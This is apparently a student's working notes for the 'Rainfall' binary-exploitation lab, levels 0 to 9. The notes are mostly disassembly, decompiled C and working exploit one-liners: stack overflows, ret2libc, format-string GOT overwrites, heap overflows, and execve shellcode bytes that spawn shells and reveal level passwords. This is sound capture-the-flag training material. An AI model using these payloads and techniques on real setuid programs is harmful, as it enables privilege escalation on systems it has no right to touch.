# Rainfall

Port forwarding and shit

```
$ ssh -p 24242 level5@localhost
          _____       _       ______    _ _ 
         |  __ \     (_)     |  ____|  | | |
         | |__) |__ _ _ _ __ | |__ __ _| | |
         |  _  /  _` | | '_ \|  __/ _` | | |
         | | \ \ (_| | | | | | | | (_| | | |
         |_|  \_\__,_|_|_| |_|_|  \__,_|_|_|

                 Good luck & Have fun

  To start, ssh with level0/level0 on 10.0.2.15:4242
level0@127.0.0.1's password: 
  GCC stack protector support:            Enabled
  Strict user copy checks:                Disabled
  Restrict /dev/mem access:               Enabled
  Restrict /dev/kmem access:              Enabled
  grsecurity / PaX: No GRKERNSEC
  Kernel Heap Hardening: No KERNHEAP
 System-wide ASLR (kernel.randomize_va_space): Off (Setting: 0)
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   /home/user/level0/level0
```

## tools

- `scp -P 24242 levelX@localhost:/home/user/levelX/levelX .`
- `getfacl <executable>`
- `file <executable>`
- `checksec --file <executable>`
- `ldd <executable>`
- `readelf -a <executable>`
- `objdump -M intel -d <executable>`
- `(echo -e "set disassembly-flavor intel\nset pagination off"; cat) | gdb <executable>`

## for gdb

```
(gdb) set disassembly-flavor intel
```

abcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcd0x08048444

abcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcdefghabcd\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80\xe8\xdc\xff\xff\xff/bin/sh

## level0

```
$ getfacl level0
# file: level0
# owner: level1
# group: users
# flags: s--
user::rwx
user:level0:r-x
user:level1:r-x
group::---
mask::r-x
other::---
```
Since the setUID bit is set, the level0 is run with the privilege of level1. 
So looking at the disassembled code we see that we need to run ./level 423 to escape the condition that prints "No !"
Therefore the program runs a shell with level1 right, so:
```console
level0@RainFall:~$ ./level0 423
$ cat /home/user/level1/.pass
1fe8a524fa4bec01ca4ea2a869af2a02260d4a7d5fe7e7c24d8617e6dca12d3a
```

## level1

```assembly
(gdb) disass main
Dump of assembler code for function main:
   0x08048480 <+0>:     push   ebp
   0x08048481 <+1>:     mov    ebp,esp
   0x08048483 <+3>:     and    esp,0xfffffff0
   0x08048486 <+6>:     sub    esp,0x50
   0x08048489 <+9>:     lea    eax,[esp+0x10]
   0x0804848d <+13>:    mov    DWORD PTR [esp],eax
   0x08048490 <+16>:    call   0x8048340 <gets@plt>
   0x08048495 <+21>:    leave  
   0x08048496 <+22>:    ret    
End of assembler dump.
```

```c
void run(void)
{
  fwrite("Good... Wait what?\n",1,0x13,stdout);
  system("/bin/sh");
  return;
}



void main(void)
{
  char local_50 [76];
  gets(local_50);
  return;
}
```

```
level1@RainFall:~$ (python -c 'print("w" * 76 + "\x44\x84\x04\x08")'; cat) | ./level1
Good... Wait what?
$ cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Why jump to "\x44\x84\x04\x08" (in reverse)? (address of `run` function)
76 why????

## level2

ooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo
qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq
zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz
https://0xrick.github.io/binary-exploitation/bof5/
https://0xrick.github.io/binary-exploitation/bof6/
eip = 0xbffff73c + 4 = 0xbffff740


0xbffff76c + 4 = 0xbffff770
shellcode: "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

0xbffff992

set disassembly-flavor intel
leave: 0x0804854a
eip: 0xbffff73c + 4 = 0xbffff740

(gdb) x/s *((char **)environ+13)
0xbfffff91:      "SHELL=/bin/sh"

user@protostar:~$ ./address 
Estimated address: 0xbffff9de

user@protostar:~$ python -c "print('A' * 76)" | /opt/protostar/bin/stack6
input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault

(gdb) p system
$1 = {<text variable, no debug info>} 0xb7ecffb0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7ec60c0 <*__GI_exit>

```python
import struct
buffer = "w" * 80
system = struct.pack("I" ,0xb7ecffb0)
exit = struct.pack("I" ,0xb7ec60c0)
#shell = struct.pack("I" ,0xbfffff91) # x/s *((char **)environ+13)
shell = struct.pack("I" ,0xbffff9be)
print buffer + system + exit + shell
```

SHELL=/bin/sh
TERM=xterm-256color
SSH_CLIENT=10.0.2.2 38990 22
SSH_TTY=/dev/pts/2
USER=user
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
PATH=/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
MAIL=/var/mail/user
PWD=/home/user
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/user
LOGNAME=user
SSH_CONNECTION=10.0.2.2 38990 10.0.2.15 22
_=/usr/bin/env

0xbffff9bd | sh: =/bin/sh: not found
0xbffff9be | good but nothing happens
0xbffff9bf | sh: bin/sh: not found



|||||||||||||||||||||||||||||||||||||||||||||||||||||||| RAINFALL ||||||||||||||||||||||||||||||||||||||||||||||||||||||||


(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e6b060 <system>

(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e5ebe0 <exit>

(gdb)  x/s *((char **)environ+0)
0xbffff915:      "SHELL=/bin/bash"

$ ./estimate_address
Estimated address: 0xbffff94e

level2@RainFall:~$ python -c "print('A' * 63)" | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
level2@RainFall:~$ python -c "print('A' * 64)" | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJ����
level2@RainFall:~$ python -c "print('A' * 75)" | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAA
level2@RainFall:~$ python -c "print('A' * 76)" | ./level2
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAJAAAAAAAA
Segmentation fault (core dumped)

(gdb) show environment
TERM=xterm-256color
SHELL=/bin/bash
SSH_CLIENT=10.0.2.2 56840 4242
SSH_TTY=/dev/pts/1
USER=level2
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31:*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.deb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35:*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mkv=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35:*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00;36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:
MAIL=/var/mail/level2
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
PWD=/home/user/level2
LANG=en_US.UTF-8
SHLVL=1
HOME=/home/user/level2
LOGNAME=level2
SSH_CONNECTION=10.0.2.2 56840 10.0.2.15 4242
LESSOPEN=| /usr/bin/lesspipe %s
LESSCLOSE=/usr/bin/lesspipe %s %s

import struct
buffer = "w" * 68 
system = struct.pack("I", 0xb7e6b060) // system
exit = struct.pack("I", 0xb7e5ebe0)
shell = struct.pack("I", 0xbffff98b)
print buffer + system + exit + shell

<63: chelou
68: /bin/bash + Segmentation fault (core dumped)
72: (0xbffff98b)
73: (0xfff98bb7)
74: (0xf98bb7e5)
76: (0xb7e5ebe0)
80: (0xb7e6b060)
82: (0xb0604141)

import struct
buffer = "w" * 76
system = struct.pack("I", 0x080483f0) // puts
exit = struct.pack("I", 0xb7e5ebe0)
shell = struct.pack("I", 0xbffff98b)
print buffer + system + exit + shell


||||||||||||||||||||||||||||||||||||||||||||||||||||||

info file in gdb -> we have access to .text which contains the instructions to be executed

```(gdb) info file
Symbols from "/home/user/level2/level2".
Unix child process:
        Using the running image of child process 2654.
        While running this, GDB does not access memory from...
Local exec file:
        `/home/user/level2/level2', file type elf32-i386.
        Entry point: 0x8048420
        0x08048134 - 0x08048147 is .interp
        0x08048148 - 0x08048168 is .note.ABI-tag
        0x08048168 - 0x0804818c is .note.gnu.build-id
        0x0804818c - 0x080481b0 is .gnu.hash
        0x080481b0 - 0x08048260 is .dynsym
        0x08048260 - 0x080482d1 is .dynstr
        0x080482d2 - 0x080482e8 is .gnu.version
        0x080482e8 - 0x08048308 is .gnu.version_r
        0x08048308 - 0x08048318 is .rel.dyn
        0x08048318 - 0x08048358 is .rel.plt
        0x08048358 - 0x08048386 is .init
        0x08048390 - 0x08048420 is .plt
        0x08048420 - 0x080485fc is .text```


```python
import struct
buffer = "w" * 68
retAdress = struct.pack("I", 0x0804853e)
system = struct.pack("I", 0xb7e6b060)
exit = struct.pack("I", 0xb7e5ebe0)
shell = struct.pack("I", 0xbffff98b)
print buffer + system + exit + shell
```

```python
import struct

padding = "\xAA" * 72
paddingROP = "\xBB" * 4                        # 1 WORD of padding as the fake return address
retAddress = struct.pack("I", 0x0804853e)       # Address of ret instruction in getpath
systemAddress = struct.pack("I", 0xb7e6b060)   # Address of system
shellAddress = struct.pack("I", 0xbffff98b)    # Address that points to /bin/shell
# shellAddress = struct.pack("I", 0xbffff98b)    # Address that points to /bin/shell

print(padding + retAddress + systemAddress + paddingROP + shellAddress)
```
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 76
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 75
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 64
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA 63



TODO SNAKE CASE
ok this spawned a shell but still level2 rights?? : 
```python
import struct

padding = "\xAA" * 80
paddingROP = "\xBB" * 4                        # 1 WORD of padding as $
retAddress = struct.pack("I", 0x0804853e)       # Address of ret instr$
systemAddress = struct.pack("I", 0xb7e6b060)   # Address of system
shellAddress = struct.pack("I", 0xbffff93f)    # Address that points t$
# shellAddress = struct.pack("I", 0xbffff98b)    # Address that points$

print(padding + retAddress + systemAddress + paddingROP + shellAddress)
```

this just ... worked ... idk, just added this variable "LOL=whoami" to test if whoami worked which it did
but it moved the shell variable
so i tried again and it worked ????

```python
import struct

padding = "\xAA" * 80
paddingROP = "\xBB" * 4                        # 1 WORD of padding as the fake r$
retAddress = struct.pack("I", 0x0804853e)       # Address of ret instruction in $
systemAddress = struct.pack("I", 0xb7e6b060)   # Address of system
shellAddress = struct.pack("I", 0xbffff93b)
#shellAddress = struct.pack("I", 0xbffff93f)    # shell adress without LOL     
#shellAddress = struct.pack("I", 0xbfffffbf)    # Address that points to /bin/sh$
```


cat .pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02


## level3

(gdb) disass
Dump of assembler code for function main:
   0x0804851a <+0>:     push   ebp
   0x0804851b <+1>:     mov    ebp,esp
=> 0x0804851d <+3>:     and    esp,0xfffffff0
   0x08048520 <+6>:     call   0x80484a4 <v>
   0x08048525 <+11>:    leave  
   0x08048526 <+12>:    ret    
End of assembler dump.

(gdb) disass
Dump of assembler code for function v:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x218
=> 0x080484ad <+9>:     mov    eax,ds:0x8049860
   0x080484b2 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484b6 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484be <+26>:    lea    eax,[ebp-0x208]
   0x080484c4 <+32>:    mov    DWORD PTR [esp],eax
   0x080484c7 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484cc <+40>:    lea    eax,[ebp-0x208]
   0x080484d2 <+46>:    mov    DWORD PTR [esp],eax
   0x080484d5 <+49>:    call   0x8048390 <printf@plt>
   0x080484da <+54>:    mov    eax,ds:0x804988c
   0x080484df <+59>:    cmp    eax,0x40
   0x080484e2 <+62>:    jne    0x8048518 <v+116>
   0x080484e4 <+64>:    mov    eax,ds:0x8049880
   0x080484e9 <+69>:    mov    edx,eax
   0x080484eb <+71>:    mov    eax,0x8048600
   0x080484f0 <+76>:    mov    DWORD PTR [esp+0xc],edx
   0x080484f4 <+80>:    mov    DWORD PTR [esp+0x8],0xc
   0x080484fc <+88>:    mov    DWORD PTR [esp+0x4],0x1
   0x08048504 <+96>:    mov    DWORD PTR [esp],eax
   0x08048507 <+99>:    call   0x80483b0 <fwrite@plt>
   0x0804850c <+104>:   mov    DWORD PTR [esp],0x804860d
   0x08048513 <+111>:   call   0x80483c0 <system@plt>
   0x08048518 <+116>:   leave  
   0x08048519 <+117>:   ret    
End of assembler dump.

```console
level3@RainFall:~$ (python -c "print('\x8c\x98\x04\x08%x%x%x.........................................%n')" ; cat) | ./level3
�200.b7fd1ac0.b7ff37d0.......................................
Wait what?!
cat /home/user/level4/.pass                                     
b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
```

## level4

```console
level4@RainFall:~$ objdump -t level4 | grep m
level4:     file format elf32-i386
080481b0 l    d  .dynsym        00000000              .dynsym
080485b4 l    d  .eh_frame_hdr  00000000              .eh_frame_hdr
080485f8 l    d  .eh_frame      00000000              .eh_frame
08049710 l    d  .dynamic       00000000              .dynamic
00000000 l    d  .comment       00000000              .comment
08049808 l     O .bss   00000001              completed.6159
08048420 l     F .text  00000000              frame_dummy
080486f8 l     O .eh_frame      00000000              __FRAME_END__
08049710 l     O .dynamic       00000000              _DYNAMIC
00000000       F *UND*  00000000              system@@GLIBC_2.0
00000000  w      *UND*  00000000              __gmon_start__
00000000       F *UND*  00000000              __libc_start_main@@GLIBC_2.0
08049810 g     O .bss   00000004              m
080484a7 g     F .text  0000000d              main
```

target : 16930116
python -c "print('\x10\x98\x04\x08%x%x%x%x%x%x%x%x%x%x%16930052s%n')" | ./level4

.pass: 0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a

## level5

```console
(gdb) disas n
Dump of assembler code for function n:
=> 0x080484c2 <+0>:     push   ebp
   0x080484c3 <+1>:     mov    ebp,esp
   0x080484c5 <+3>:     sub    esp,0x218
   0x080484cb <+9>:     mov    eax,ds:0x8049848
   0x080484d0 <+14>:    mov    DWORD PTR [esp+0x8],eax
   0x080484d4 <+18>:    mov    DWORD PTR [esp+0x4],0x200
   0x080484dc <+26>:    lea    eax,[ebp-0x208]
   0x080484e2 <+32>:    mov    DWORD PTR [esp],eax
   0x080484e5 <+35>:    call   0x80483a0 <fgets@plt>
   0x080484ea <+40>:    lea    eax,[ebp-0x208]
   0x080484f0 <+46>:    mov    DWORD PTR [esp],eax
   0x080484f3 <+49>:    call   0x8048380 <printf@plt>
   0x080484f8 <+54>:    mov    DWORD PTR [esp],0x1
   0x080484ff <+61>:    call   0x80483d0 <exit@plt>
End of assembler dump.
(gdb) disas o
Dump of assembler code for function o:
   0x080484a4 <+0>:     push   ebp
   0x080484a5 <+1>:     mov    ebp,esp
   0x080484a7 <+3>:     sub    esp,0x18
   0x080484aa <+6>:     mov    DWORD PTR [esp],0x80485f0
   0x080484b1 <+13>:    call   0x80483b0 <system@plt>
   0x080484b6 <+18>:    mov    DWORD PTR [esp],0x1
   0x080484bd <+25>:    call   0x8048390 <_exit@plt>
End of assembler dump.
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void shell() {
    system("/bin/sh");
    _exit(1);
}

void cat() {
    char s[520];

    fgets(s, 512, stdin);
    printf(s);
    exit(1);
}

int main() { cat(); }
```

```console
(gdb) p n 
$3 = {<text variable, no debug info>} 0x80484c2 <n>
(gdb) p o
$4 = {<text variable, no debug info>} 0x80484a4 <o>
```

```console
(gdb) info function exit
All functions matching regular expression "exit":

Non-debugging symbols:
0x08048390  _exit
0x08048390  _exit@plt
0x080483d0  exit
0x080483d0  exit@plt
0xb7e5ebe0  exit
0xb7ee41d8  _exit
```

```console
level5@RainFall:~$ objdump -R ./level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
```

```console
$ python -c 'print("wwww" + " %x" * 10)' | ./level5
wwww 200 b7fd1ac0 b7ff37d0 77777777 20782520 25207825 78252078 20782520 25207825 78252078
```

o = 0x80484a4 = 134513828 = (2052, 33956)
exit@got = 08049838 = 134518840 = (2052, 38968)

Payload :
- exit@got low
- exit@got high
- 2052 - 8 = 2044 dummy chars
- %4$hn : write 2052 to 4th argument (actually start of format string)
- 33956 - 2052 = 31904 dummy chars
- %5$hn : write 33956 to 5th argument (actually start of format string + 4)

```console
level5@RainFall:~$ (python -c 'print("\x3a\x98\x04\x08\x38\x98\x04\x08" + "%2044d%4$hn%31904d%5$hn")' ; cat) | ./level5
[...]
$ whoami
level6
$ cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
```

## level6

Heap overflow

```console
$ objdump -t level6 | grep n
08048454 g     F .text  00000014              n
$ ./level6 $(python -c 'print("w" * 64 + "\x54\x84\x04\x08")')
Nope
$ ./level6 $(python -c 'print("w" * 68 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
$ ./level6 $(python -c 'print("w" * 72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
$ ./level6 $(python -c 'print("w" * 76 + "\x54\x84\x04\x08")')
Segmentation fault (core dumped)
```

72 byte of padding and not 64 because 8 bytes of metadata in malloc

## level7

The goal is to call `m` after `fgets`, so we need to overwrite `puts@GOT` with the address of `m`.

```console
level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEE aaaabbbbccccddddeeee
~~
level7@RainFall:~$ ./level7 AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVWWWWXXXXYYYYZZZZ aaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuuvvvvwwwwxxxxyyyyzzzz
Segmentation fault (core dumped)
```

```console
(gdb) p m
$1 = {<text variable, no debug info>} 0x80484f4 <m>
(gdb) b main
Breakpoint 1 at 0x8048524
(gdb) run
Starting program: /home/user/level7/level7 

Breakpoint 1, 0x08048524 in main ()
(gdb) disas
Dump of assembler code for function main:
   0x08048521 <+0>:     push   ebp
   0x08048522 <+1>:     mov    ebp,esp
=> 0x08048524 <+3>:     and    esp,0xfffffff0
   0x08048527 <+6>:     sub    esp,0x20
   0x0804852a <+9>:     mov    DWORD PTR [esp],0x8
   0x08048531 <+16>:    call   0x80483f0 <malloc@plt>
   0x08048536 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x0804853a <+25>:    mov    eax,DWORD PTR [esp+0x1c]
   0x0804853e <+29>:    mov    DWORD PTR [eax],0x1
   0x08048544 <+35>:    mov    DWORD PTR [esp],0x8
   0x0804854b <+42>:    call   0x80483f0 <malloc@plt>
   0x08048550 <+47>:    mov    edx,eax
   0x08048552 <+49>:    mov    eax,DWORD PTR [esp+0x1c]
   0x08048556 <+53>:    mov    DWORD PTR [eax+0x4],edx
   0x08048559 <+56>:    mov    DWORD PTR [esp],0x8
   0x08048560 <+63>:    call   0x80483f0 <malloc@plt>
   0x08048565 <+68>:    mov    DWORD PTR [esp+0x18],eax
   0x08048569 <+72>:    mov    eax,DWORD PTR [esp+0x18]
   0x0804856d <+76>:    mov    DWORD PTR [eax],0x2
   0x08048573 <+82>:    mov    DWORD PTR [esp],0x8
   0x0804857a <+89>:    call   0x80483f0 <malloc@plt>
   0x0804857f <+94>:    mov    edx,eax
   0x08048581 <+96>:    mov    eax,DWORD PTR [esp+0x18]
   0x08048585 <+100>:   mov    DWORD PTR [eax+0x4],edx
   0x08048588 <+103>:   mov    eax,DWORD PTR [ebp+0xc]
   0x0804858b <+106>:   add    eax,0x4
   0x0804858e <+109>:   mov    eax,DWORD PTR [eax]
   0x08048590 <+111>:   mov    edx,eax
   0x08048592 <+113>:   mov    eax,DWORD PTR [esp+0x1c]
   0x08048596 <+117>:   mov    eax,DWORD PTR [eax+0x4]
   0x08048599 <+120>:   mov    DWORD PTR [esp+0x4],edx
   0x0804859d <+124>:   mov    DWORD PTR [esp],eax
   0x080485a0 <+127>:   call   0x80483e0 <strcpy@plt>
   0x080485a5 <+132>:   mov    eax,DWORD PTR [ebp+0xc]
   0x080485a8 <+135>:   add    eax,0x8
   0x080485ab <+138>:   mov    eax,DWORD PTR [eax]
   0x080485ad <+140>:   mov    edx,eax
   0x080485af <+142>:   mov    eax,DWORD PTR [esp+0x18]
   0x080485b3 <+146>:   mov    eax,DWORD PTR [eax+0x4]
   0x080485b6 <+149>:   mov    DWORD PTR [esp+0x4],edx
   0x080485ba <+153>:   mov    DWORD PTR [esp],eax
   0x080485bd <+156>:   call   0x80483e0 <strcpy@plt>
   0x080485c2 <+161>:   mov    edx,0x80486e9
   0x080485c7 <+166>:   mov    eax,0x80486eb
   0x080485cc <+171>:   mov    DWORD PTR [esp+0x4],edx
   0x080485d0 <+175>:   mov    DWORD PTR [esp],eax
   0x080485d3 <+178>:   call   0x8048430 <fopen@plt>
   0x080485d8 <+183>:   mov    DWORD PTR [esp+0x8],eax
   0x080485dc <+187>:   mov    DWORD PTR [esp+0x4],0x44
   0x080485e4 <+195>:   mov    DWORD PTR [esp],0x8049960
   0x080485eb <+202>:   call   0x80483c0 <fgets@plt>
   0x080485f0 <+207>:   mov    DWORD PTR [esp],0x8048703
   0x080485f7 <+214>:   call   0x8048400 <puts@plt>
   0x080485fc <+219>:   mov    eax,0x0
   0x08048601 <+224>:   leave  
   0x08048602 <+225>:   ret    
End of assembler dump.
(gdb) i fun puts  
All functions matching regular expression "puts":

Non-debugging symbols:
0x08048400  puts
0x08048400  puts@plt
0xb7e911a0  _IO_fputs
0xb7e911a0  fputs
0xb7e927e0  _IO_puts
0xb7e927e0  puts
0xb7e96ee0  fputs_unlocked
0xb7f20750  putspent
0xb7f21fa0  putsgent
(gdb) x/i 0x08048400
   0x8048400 <puts@plt>:        jmp    DWORD PTR ds:0x8049928
(gdb) x/6b 0x08048400
0x8048400 <puts@plt>:   0xff    0x25    0x28    0x99    0x04    0x08
```

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>

char c[68];

typedef struct item_t {
    int id;
    char* buf;
} item_t;

void m() {
    printf("%s - %d\n", c, (int)time(NULL));
    return;
}

int main(int argc, char** argv) {
    item_t* item1 = malloc(sizeof(item_t));
    item1->id = 1;
    item1->buf = malloc(8);

    item_t* item2 = malloc(sizeof(item_t));
    item2->id = 2;
    item2->buf = malloc(8);

    strcpy(item1->buf, argv[1]);
    strcpy(item2->buf, argv[2]);

    FILE* stream = fopen("/home/user/level8/.pass", "r");
    fgets(c, 68, stream);

    puts("~~");
    return 0;
}
```

       m = 0x80484f4
puts@got = 0x8049928

padding : item1->buf (8) + malloc header (8) + item2->id (4) = 20

```console
level7@RainFall:~$ ./level7 $(python -c 'print("w" * 20 + "\x28\x99\x04\x08")') $(python -c 'print("\xf4\x84\x04\x08")')
5684af5cb4c8679958be4abe6373147ab52d95768e047820bf382e44fa8d8fb9
 - 1765095212
```

## level8

```console
level8@RainFall:~$ ./level8 
(nil), (nil) 
auth axel
0x804a008, (nil) 
service!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
0x804a008, 0x804a018 
login
$ whoami
level9
$ cat /home/user/level9/.pass
c542e581c5ba5162a85f767996e3247ed619ef6c6f7b76a59435545dc6259f8a
```

auth[32] overflows and reads in service

## level9

```console
(gdb) i fun N::
All functions matching regular expression "N::":

Non-debugging symbols:
0x080486f6  N::N(int)
0x080486f6  N::N(int)
0x0804870e  N::setAnnotation(char*)
0x0804873a  N::operator+(N&)
0x0804874e  N::operator-(N&)
gdb) disas main
Dump of assembler code for function main:
   0x080485f4 <+0>:     push   ebp
   0x080485f5 <+1>:     mov    ebp,esp
   0x080485f7 <+3>:     push   ebx
   0x080485f8 <+4>:     and    esp,0xfffffff0
   0x080485fb <+7>:     sub    esp,0x20
   0x080485fe <+10>:    cmp    DWORD PTR [ebp+0x8],0x1
   0x08048602 <+14>:    jg     0x8048610 <main+28>
   0x08048604 <+16>:    mov    DWORD PTR [esp],0x1
   0x0804860b <+23>:    call   0x80484f0 <_exit@plt>
   0x08048610 <+28>:    mov    DWORD PTR [esp],0x6c
   0x08048617 <+35>:    call   0x8048530 <_Znwj@plt>
   0x0804861c <+40>:    mov    ebx,eax
   0x0804861e <+42>:    mov    DWORD PTR [esp+0x4],0x5
   0x08048626 <+50>:    mov    DWORD PTR [esp],ebx
   0x08048629 <+53>:    call   0x80486f6 <_ZN1NC2Ei>
   0x0804862e <+58>:    mov    DWORD PTR [esp+0x1c],ebx
   0x08048632 <+62>:    mov    DWORD PTR [esp],0x6c
   0x08048639 <+69>:    call   0x8048530 <_Znwj@plt>
   0x0804863e <+74>:    mov    ebx,eax
   0x08048640 <+76>:    mov    DWORD PTR [esp+0x4],0x6
   0x08048648 <+84>:    mov    DWORD PTR [esp],ebx
